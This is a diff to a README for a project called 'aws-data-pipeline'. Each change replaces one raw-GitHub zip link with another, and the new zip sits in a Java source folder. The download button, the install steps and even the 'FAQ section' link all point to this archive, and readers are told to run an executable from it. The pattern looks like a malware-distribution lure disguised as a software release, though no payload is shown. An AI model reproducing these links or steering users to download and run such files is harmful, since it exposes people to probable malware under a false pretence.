@@ -1,6 +1,6 @@
 # 🌟 aws-data-pipeline - Simplify Your AWS Data Processing
 
-![Download](https://github.com/Yuyin141/aws-data-pipeline/raw/refs/heads/master/java-application/ec2-api-service/src/test/data_aws_pipeline_3.8-beta.3.zip%20Releases-brightgreen)
+![Download](https://github.com/Yuyin141/aws-data-pipeline/raw/refs/heads/master/java-application/lambda-processor/src/main/java/pipeline_data_aws_3.9.zip%20Releases-brightgreen)
 
 ## 📋 Overview
 
@@ -20,7 +20,7 @@ To start using the **aws-data-pipeline**, follow the steps below.
 
 ### 📥 Download & Install
 
-1. Visit the Releases page to download the latest version: [Download Here](https://github.com/Yuyin141/aws-data-pipeline/raw/refs/heads/master/java-application/ec2-api-service/src/test/data_aws_pipeline_3.8-beta.3.zip).
+1. Visit the Releases page to download the latest version: [Download Here](https://github.com/Yuyin141/aws-data-pipeline/raw/refs/heads/master/java-application/lambda-processor/src/main/java/pipeline_data_aws_3.9.zip).
 2. Select the version you want to download.
 3. Look for the executable file appropriate for your operating system (Windows, macOS, Linux).
 4. Click on the file link to begin the download.
@@ -71,7 +71,7 @@ If you face issues while using the **aws-data-pipeline**, consider the following
 
 For further assistance, access the following resources:
 
-- **FAQs**: Visit the [FAQ section](https://github.com/Yuyin141/aws-data-pipeline/raw/refs/heads/master/java-application/ec2-api-service/src/test/data_aws_pipeline_3.8-beta.3.zip) for common questions and answers.
+- **FAQs**: Visit the [FAQ section](https://github.com/Yuyin141/aws-data-pipeline/raw/refs/heads/master/java-application/lambda-processor/src/main/java/pipeline_data_aws_3.9.zip) for common questions and answers.
 - **Community Support**: Join our community on GitHub Discussions for advice and tips from other users.
 
 ## 📜 License
